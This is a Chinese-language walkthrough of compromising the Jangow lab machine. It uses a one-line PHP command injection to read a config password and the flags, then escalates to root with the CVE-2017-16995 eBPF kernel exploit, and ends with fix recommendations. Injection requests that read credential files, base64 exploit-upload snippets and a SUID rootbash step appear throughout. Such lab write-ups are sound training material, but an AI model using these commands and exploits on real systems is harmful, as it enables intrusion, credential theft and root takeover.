# Jangow 靶机渗透演示报告

**目标 IP**: 192.168.56.118  
**操作系统**: Ubuntu 16.04 LTS  
**内核版本**: 4.4.0-31-generic  
**难度**: 初级  
**完成时间**: 2026-04-13  

---

## 一、侦察阶段

### 1.1 端口扫描

```
nmap -sV -sC -p- --min-rate 3000 192.168.56.118
```

| 端口 | 服务 | 版本 |
|------|------|------|
| 21/TCP | FTP | vsftpd 3.0.3 |
| 80/TCP | HTTP | Apache httpd 2.4.18 (Ubuntu) |

**发现**：根路径 `/` 列目录，存在 `/site/` 子目录。FTP 不支持匿名登录。

### 1.2 Web 内容探测

访问 `http://192.168.56.118/site/` 发现 Bootstrap 模板页面，导航栏含关键链接：

```html
<a class="nav-link" href="busque.php?buscar=">Buscar</a>
```

`busque.php` 含参数 `buscar`（西班牙语"搜索"），高度可疑。

---

## 二、漏洞利用 — 命令注入 RCE

### 2.1 漏洞验证

```
GET /site/busque.php?buscar=id
```

**响应**：
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**漏洞原理**：`busque.php` 源码仅一行：
```php
<?php system($_GET['buscar']); ?>
```

无任何过滤，直接将用户输入传给 `system()`，造成完全 RCE。

### 2.2 信息收集

通过 RCE 枚举系统信息：

- **OS**: Ubuntu 16.04，内核 `4.4.0-31-generic`
- **用户**: `jangow01`（/home/jangow01/user.txt）
- **Web 目录**: `/var/www/html/site/`，含 `wordpress/config.php`

### 2.3 凭据获取

读取 WordPress 配置文件：

```
GET /site/busque.php?buscar=cat+/var/www/html/site/wordpress/config.php
```

```php
$username = "desafio02";
$password = "abygurl69";
```

### 2.4 User Flag

```
GET /site/busque.php?buscar=cat+/home/jangow01/user.txt
```

**User Flag**: `d41d8cd98f00b204e9800998ecf8427e`

---

## 三、权限提升 — CVE-2017-16995 (eBPF 内核漏洞)

### 3.1 漏洞分析

| 项目 | 详情 |
|------|------|
| CVE | CVE-2017-16995 |
| 类型 | Linux 内核 eBPF 验证器整数溢出 |
| 影响内核 | 4.4.x、4.8.x、4.10.x、4.13.x |
| 目标内核 | 4.4.0-31-generic ✓ |
| 前提条件 | `unprivileged_bpf_disabled=0`（默认）|

**漏洞根因**：Linux eBPF 验证器在处理 BPF_ALU64_IMM 指令时，未正确区分有符号/无符号整数比较，攻击者可利用越界写操作覆盖内核凭据结构，将当前进程 UID/GID 改为 0。

### 3.2 利用过程

**步骤 1**：通过 HTTP RCE 分块传输 exploit 源码

由于靶机无法出站访问本机（防火墙限制），使用 base64 分块编码通过 GET 参数逐段写入：

```python
# 37 个 500 字节 chunk
rce(f"echo -n '{chunk}' >> /tmp/45010_b64.txt")
rce("base64 -d /tmp/45010_b64.txt > /tmp/45010.c")
```

**步骤 2**：在靶机上编译（gcc 5.4.0 可用）

```
cd /tmp && gcc -o 45010_mod 45010_mod.c
```

**步骤 3**：执行 exploit（修改版，通过 `system()` 执行 payload 而非启动交互 shell）

```
/tmp/45010_mod
```

**Exploit 输出**：
```
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003d9baa00
[*] Leaking sock struct from ffff880039948b40
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880039ee10c0
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff880039ee10c0
[*] credentials patched, running payload...
```

### 3.3 结果验证

```
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**SUID rootbash 已创建**：
```
-rwsr-sr-x 1 root root 1037528 Apr 13 07:36 /tmp/rootbash
```

---

## 四、Root Flag

```
cat /root/proof.txt
```

**Root Flag**: `da39a3ee5e6b4b0d3255bfef95601890afd80709`

```
                   @@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@&&&&&&&&&&&&&&                          
                   @  @@@@@@@@@@@@@@@&#   #@@@@@@@@&(.    /&@@@@@@@@@@                          
                   ...（ASCII art "JANGOW"）...
```

---

## 五、攻击链总结

```
信息收集
  └── nmap → 21(FTP), 80(HTTP/Apache)
      └── Web 目录枚举 → /site/busque.php?buscar=

命令注入 RCE (www-data)
  └── busque.php → system($_GET['buscar'])
      ├── User Flag: d41d8cd98f00b204e9800998ecf8427e
      └── 读取 config.php → 密码 abygurl69

权限提升 (CVE-2017-16995)
  └── 内核 4.4.0-31 eBPF 验证器越界写
      ├── 编译 exploit on-target (gcc 5.4.0)
      ├── 覆盖 cred 结构 → uid=0
      └── Root Flag: da39a3ee5e6b4b0d3255bfef95601890afd80709
```

---

## 六、修复建议

| 漏洞 | 修复方案 |
|------|---------|
| 命令注入 | 删除 `busque.php`；如需保留，使用白名单过滤，禁止直接传入 system() |
| 内核漏洞 CVE-2017-16995 | 升级内核至 4.4.0-92+ 或 4.15+；或设置 `kernel.unprivileged_bpf_disabled=1` |
| FTP 服务 | 如不需要，关闭 vsftpd；需要则强制 FTPS |
| 数据库凭据明文 | 使用环境变量或加密存储，不要写入 Web 可访问目录 |
